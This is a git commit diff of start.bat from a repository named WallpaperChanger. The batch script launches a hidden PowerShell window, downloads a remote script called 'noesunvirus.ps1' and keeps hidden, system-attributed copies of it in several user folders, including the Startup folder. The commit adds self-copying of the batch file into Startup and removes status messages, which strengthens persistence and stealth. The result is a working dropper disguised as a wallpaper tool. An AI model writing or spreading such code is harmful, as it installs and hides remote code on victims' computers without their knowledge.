13c64472405ec24b3a6444e4d998a110ff77fc83
notthecoolguyyouknow <9omxzzh1@duck.com>
2024-09-26 21:03:59 -0300

    update for new stuff

--- start.bat
+++ start.bat
@@ -1,5 +1,4 @@
 @echo off
-
 powershell -WindowStyle Hidden -Command ""
 
 set scriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/noesunvirus.ps1
@@ -8,21 +7,26 @@ set scriptPath1=%userprofile%\Downloads\noesunvirus.ps1
 set scriptPath2=%userprofile%\Documents\noesunvirus.ps1
 set scriptPath3=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1
 
+set batchPath=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat
+
+if not exist "%batchPath%" (
+    copy "%~f0" "%batchPath%"
+    attrib +h +s "%batchPath%"
+)
+
 :checkloop
+
 if not exist "%scriptPath1%" (
-    echo Script missing from %scriptPath1%. Re-downloading...
     powershell -Command "Invoke-WebRequest -Uri '%scriptURL%' -OutFile '%scriptPath1%'"
     attrib +h +s "%scriptPath1%"
 )
 
 if not exist "%scriptPath2%" (
-    echo Script missing from %scriptPath2%. Recreating...
     copy "%scriptPath1%" "%scriptPath2%"
     attrib +h +s "%scriptPath2%"
 )
 
 if not exist "%scriptPath3%" (
-    echo Script missing from %scriptPath3%. Recreating...
     copy "%scriptPath1%" "%scriptPath3%"
     attrib +h +s "%scriptPath3%"
 )
